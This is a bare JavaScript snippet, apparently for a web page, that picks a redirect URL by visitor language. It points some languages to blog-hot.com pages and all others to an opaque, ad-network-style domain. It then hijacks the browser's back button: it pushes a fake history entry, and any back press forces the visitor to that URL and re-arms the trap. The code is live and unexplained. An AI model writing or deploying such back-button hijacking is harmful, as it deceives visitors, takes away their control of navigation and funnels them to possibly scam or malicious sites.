var bhs = lang;
	if(bhs == "ID") 	var linkredir = "https://www.blog-hot.com/p/blog-page_24.html"  
	else if(bhs == "MY") 	var linkredir = "https://www.blog-hot.com/p/my-penjelasan-fxc.html"          
	else if(bhs == "IN") 	var linkredir = "https://www.blog-hot.com/p/in.html"          
	else if(bhs == "TH") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"          
	else if(bhs == "VN") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"          
	else if(bhs == "TR") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"    
	else if(bhs == "RO") 	var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"    
	else                    var linkredir = "https://porrect-loculying.com/791c5ae0-e222-4f8c-bd77-d6200b760d6b"    

window.history.pushState('forward', null, '');
window.onpopstate = function() {
window.location.href = linkredir;
window.history.pushState('forward', null, '');
};
